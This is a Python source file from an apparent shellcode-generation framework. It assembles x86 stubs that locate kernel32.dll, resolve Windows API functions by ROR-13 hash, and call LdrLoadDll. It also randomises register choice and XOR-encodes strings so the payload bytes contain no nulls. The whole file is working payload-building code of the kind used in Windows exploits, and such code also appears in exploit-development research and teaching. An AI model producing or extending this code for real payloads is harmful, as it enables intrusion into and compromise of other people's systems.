#!/usr/bin/python

"""
General kernel32.dll base address resolution template, methods can be overriden with specific implementations
"""

from random import choice
from assembler.assembler import assembler
from payload_modules.core.core import payload_module
from arch.core import word_keywords, stackpointer_registers, stackframepointer_registers, acc_regs, ctr_regs, data_regs, base_regs, src_index_regs, dest_index_regs, arch_registers

class kernel32_base_resolution(payload_module):

	def get_stub(self, base_reg):

		acc_reg = acc_regs[self.bits]

		regs = arch_registers(self.arch, self.bits)		
		base_in_reg = regs.random_gp_reg(False, [acc_reg])

		resolution_stub = self.base_resolution_stub(base_in_reg)
		finder_stub = self.find_function_stub()
		tokernel_stub = self.to_kernel32_stub(base_in_reg, base_reg)

		variables = {'resolution_stub': resolution_stub, 'finder_stub': finder_stub, 'tokernel_stub': tokernel_stub}

		listing = '''		
main:
	{resolution_stub}
	;TODO: MIASM rearranges order introducing nullbytes here
	JMP to_kernel_32

	{finder_stub}

to_kernel_32:
	{tokernel_stub}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub

	"""
	Method to be overriden by child classes implementing it
	"""
	def base_resolution_stub(self, base_reg):
		return ""

	"""
	Given a base address and a function hash this stub will dynamically resolve the address of the function within the target library
	"""
	def find_function_stub(self):

		stackpointer_reg = stackpointer_registers[self.bits]
		stackframepointer_reg = stackframepointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]
		src_index_reg = src_index_regs[self.bits]
		dest_index_reg = dest_index_regs[self.bits]

		regs = arch_registers(self.arch, self.bits)
		reg1 = stackframepointer_reg
		reg2 = acc_regs[self.bits]
		reg3 = data_regs[self.bits]
		reg4 = base_regs[self.bits]

		variables = {'word_keyword': word_keyword, 'stackpointer_reg': stackpointer_reg, 'null_instr': null_instr, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'reg4': reg4, 'dest_index_reg': dest_index_reg, 'src_index_reg': src_index_reg}

		# TODO: account for clobbering of reg1 (currently offsets take into account only PUSHAD regs, need to address 1 more)

  		listing = '''
find_function:
	PUSHAD ; save all registers

	MOV {reg1}, {word_keyword} PTR [{stackpointer_reg} + 0x24] 	; base address of module being loaded
	MOV {reg2}, {word_keyword} PTR [{reg1} + 0x3C] 				; skip over MSDOS header

	MOV {reg3}, {word_keyword} PTR [{reg1} + {reg2} + 0x78] 	; export table offset
	ADD {reg3}, {reg1}											; add base address to offset

	MOV {ctr_reg}, {word_keyword} PTR [{reg3} + 0x18]			; set counter (# of exported items)

	MOV {reg4}, {word_keyword} PTR [{reg3} + 0x20]				; names table offset
	ADD {reg4}, {reg1}											; add base address to offset

	; reg3 = export table address, reg4 = names table address

find_function_loop:
	TEST {ctr_reg}, {ctr_reg}
	JZ find_function_finished											; if ctr_reg = 0 then we've check the last symbol
	DEC {ctr_reg}

	MOV {src_index_reg}, {word_keyword} PTR [{reg4} + {ctr_reg} * 4]	; offset of name associated with current symbol
	ADD {src_index_reg}, {reg1}											; add base address to offset

compute_hash:
	{null_instr} {dest_index_reg}, {dest_index_reg}						; null
	{null_instr} {acc_reg}, {acc_reg}									; null
	CLD 																; clear direction flag, will make sure lods* will increment pointer

compute_hash_again:
	LODSB 																; load bytes at src_index_reg
	TEST AL, AL
	JZ compute_hash_finished

	ROR {dest_index_reg}, 0x0D 											; if zero flag is not set rotate current hash value
	ADD {dest_index_reg}, {acc_reg}										; add current character
	JMP compute_hash_again

compute_hash_finished:

	CMP {dest_index_reg}, {word_keyword} PTR [{stackpointer_reg} + 0x28]	; see if computed hash matches requested hash
JNZ find_function_loop														; next symbol if no match

	MOV {reg4}, {word_keyword} PTR [{reg3} + 0x24]							; ordinals table offset
	ADD {reg4}, {reg1}														; add base address to offset
	
	MOV CX, WORD PTR [{reg4} + 2 * {ctr_reg}]								; current symbol's ordinal number
	
	MOV {reg4}, {word_keyword} PTR [{reg3} + 0x1C]							; address table offset
	ADD {reg4}, {reg1}														; add base address to offset

	MOV {acc_reg}, {word_keyword} PTR [{reg4} + 4 * {ctr_reg}]				; function offset from ordinal
	ADD {acc_reg}, {reg1}													; add base address to offset

	MOV {word_keyword} PTR [{stackpointer_reg} + 0x1C], {acc_reg}			; overwrite stack saved {acc_reg} so POPAD will return function address

find_function_finished:
	POPAD
	RET
'''

		return listing.format(**variables)

	"""
	Given an address that is either the ntdll.dll or kernel32.dll base address, this stub will return the kernel32.dll base address
	On Windows versions > XP base address resolution methods will commonly resolve ntdll.dll (due to relocation of certain functions)
	This function ensures cross-version compatibility
	"""
	def to_kernel32_stub(self, base_reg_in, base_reg_out):

		reg_size = 2**self.bits
		word_size = self.bits / 8

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]

		src_index_reg = src_index_regs[self.bits]
		dest_index_reg = dest_index_regs[self.bits]

		regs = arch_registers(self.arch, self.bits)
		reg1 = regs.random_gp_reg(False, [acc_reg, src_index_reg, dest_index_reg])
		reg2 = regs.random_gp_reg(False, [acc_reg, reg1])
		reg3 = regs.random_gp_reg(False, [acc_reg])

		reg1_16 = regs.gp_reg_to_size(reg1, self.bits, 16)
		reg1_08_low = regs.gp_reg_to_size(reg1, self.bits, (8 | 0))

		variables = {'base_reg_in': base_reg_in, 'base_reg_out': base_reg_out, 'reg_size': reg_size, 'word_keyword': word_keyword, 'word_size': word_size, 'stackpointer_reg': stackpointer_reg, 'null_instr': null_instr, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'reg1_16': reg1_16, 'reg1_08_low': reg1_08_low}

  		listing = '''
	PUSH {base_reg_in}

	{null_instr} {acc_reg}, {acc_reg}

	; check if LdrLoadDll is present, if not, we have kernel32.dll base address, else we have ntdll.dll and use LdrLoadDll to obtain it
	PUSH 0xB0988FE4 ; get LdrLoadDll hash
  	PUSH {base_reg_in}
  	CALL find_function

  	; restore stack
  	SUB {stackpointer_reg}, (-({word_size} * 2) % {reg_size})

  	TEST {acc_reg}, {acc_reg}
  	JZ got_kernel32

  	; LdrLoadDll address in acc_reg now

  	; construct UNICODE_STRING u('kernel32.dll') structure on stack
    PUSH 0x016d016d
    PUSH 0x0165012f
    PUSH 0x01330132
    PUSH 0x016d0164
    PUSH 0x016f0173
    PUSH 0x0164016a

    {null_instr} {ctr_reg}, {ctr_reg}
    SUB {ctr_reg}, (-6 % {reg_size})

    ; decode string to put null-bytes back in
un_zero:
	XOR {word_keyword} PTR [{stackpointer_reg} + ({ctr_reg} * 4) - 4], 0x01010101
LOOP un_zero

	PUSH {stackpointer_reg} ; PWSTR buffer = &libraryName

	{null_instr} {reg1}, {reg1}
	MOV {reg1_08_low}, (12 * 2)

	PUSH {reg1_16}  ; USHORT maximumLength
	PUSH {reg1_16}  ; USHORT length

	MOV {reg1}, {stackpointer_reg} ; reg1 = UNICODE_STRING

	{null_instr} {reg2}, {reg2}
	PUSH {reg2} ; allocate DWORD for uModHandle
	MOV {reg2}, {stackpointer_reg} ; &uModHandle

	PUSH {reg2} ; &uModHandle
	PUSH {reg1} ; &uModName

	{null_instr} {reg3}, {reg3}
	PUSH {reg3} ; NULL
	PUSH {reg3} ; NULL
	CALL {acc_reg} ; ldrLoadDll(0, 0, &uModName, &uModHandle)

	MOV {acc_reg}, {word_keyword} PTR [{stackpointer_reg}] ; acc_reg = kernel32.dll base address
	SUB {stackpointer_reg}, (-(10 * {word_size}) % {reg_size}) ; restore stack
	JMP end_stub

got_kernel32:
	POP {acc_reg}	; base_reg_in to acc_reg

end_stub:
	MOV {base_reg_out}, {acc_reg}
'''

		return listing.format(**variables)